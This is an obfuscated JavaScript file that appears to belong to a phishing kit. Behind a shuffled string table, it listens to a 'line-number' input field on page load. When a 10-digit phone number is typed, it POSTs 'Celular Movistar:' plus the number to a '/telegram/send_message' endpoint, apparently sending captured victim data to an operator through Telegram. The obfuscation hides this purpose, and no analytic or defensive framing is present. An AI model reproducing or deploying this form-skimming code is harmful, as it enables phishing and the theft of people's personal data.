function _0xd6ad(_0x366ad4, _0x535390) {
  const _0x5cc508 = _0x5cc5();
  return (
    (_0xd6ad = function (_0xd6ad2e, _0x345b56) {
      _0xd6ad2e = _0xd6ad2e - 0xb9;
      let _0x564609 = _0x5cc508[_0xd6ad2e];
      return _0x564609;
    }),
    _0xd6ad(_0x366ad4, _0x535390)
  );
}
function _0x5cc5() {
  const _0x3e85cd = [
    "347423CpfhLn",
    "error",
    "json",
    "9cFYSfm",
    "application/json",
    "6466170geNKbT",
    "length",
    "6zBQxRj",
    "14199420VOxRKY",
    "🔵\x20Celular\x20Movistar:\x20",
    "38591gBYLoU",
    "addEventListener",
    "line-number",
    "7559432JuxJHs",
    "stringify",
    "POST",
    "Mensaje\x20enviado\x20correctamente:\x20",
    "2TymJtY",
    "628857eXCTgV",
    "DOMContentLoaded",
    "Error\x20al\x20enviar\x20el\x20mensaje:",
    "/telegram/send_message",
    "getElementById",
    "2085012OvOPYq",
  ];
  _0x5cc5 = function () {
    return _0x3e85cd;
  };
  return _0x5cc5();
}
const _0x400914 = _0xd6ad;
(function (_0x5a77fe, _0x337131) {
  const _0x5b0df6 = _0xd6ad,
    _0x5414d6 = _0x5a77fe();
  while (!![]) {
    try {
      const _0x35d7be =
        parseInt(_0x5b0df6(0xce)) / 0x1 +
        (-parseInt(_0x5b0df6(0xc7)) / 0x2) * (parseInt(_0x5b0df6(0xc8)) / 0x3) +
        -parseInt(_0x5b0df6(0xcd)) / 0x4 +
        -parseInt(_0x5b0df6(0xbb)) / 0x5 +
        (parseInt(_0x5b0df6(0xbd)) / 0x6) * (parseInt(_0x5b0df6(0xc0)) / 0x7) +
        (parseInt(_0x5b0df6(0xc3)) / 0x8) * (parseInt(_0x5b0df6(0xb9)) / 0x9) +
        parseInt(_0x5b0df6(0xbe)) / 0xa;
      if (_0x35d7be === _0x337131) break;
      else _0x5414d6["push"](_0x5414d6["shift"]());
    } catch (_0x421ad9) {
      _0x5414d6["push"](_0x5414d6["shift"]());
    }
  }
})(_0x5cc5, 0xa95c5);
let messageSent = ![];
async function sendToTelegram() {
  const _0x553892 = _0xd6ad,
    _0x9ec7de = document["getElementById"]("line-number"),
    _0x35e865 = _0x9ec7de["value"];
  if (_0x35e865[_0x553892(0xbc)] === 0xa && !messageSent) {
    messageSent = !![];
    try {
      const _0x389ac1 = await fetch(url + _0x553892(0xcb), {
        method: _0x553892(0xc5),
        headers: { "Content-Type": _0x553892(0xba) },
        body: JSON[_0x553892(0xc4)]({ message: _0x553892(0xbf) + _0x35e865 }),
      });
      _0x389ac1["ok"]
        ? console["log"](_0x553892(0xc6) + _0x35e865)
        : console[_0x553892(0xcf)](
            _0x553892(0xca),
            await _0x389ac1[_0x553892(0xd0)]()
          );
    } catch (_0x1717f1) {
      console[_0x553892(0xcf)]("Error:", _0x1717f1);
    } finally {
      messageSent = ![];
    }
  }
}
document[_0x400914(0xc1)](_0x400914(0xc9), function () {
  const _0x2dd218 = _0x400914,
    _0x3ded32 = document[_0x2dd218(0xcc)](_0x2dd218(0xc2));
  _0x3ded32[_0x2dd218(0xc1)]("input", sendToTelegram);
});
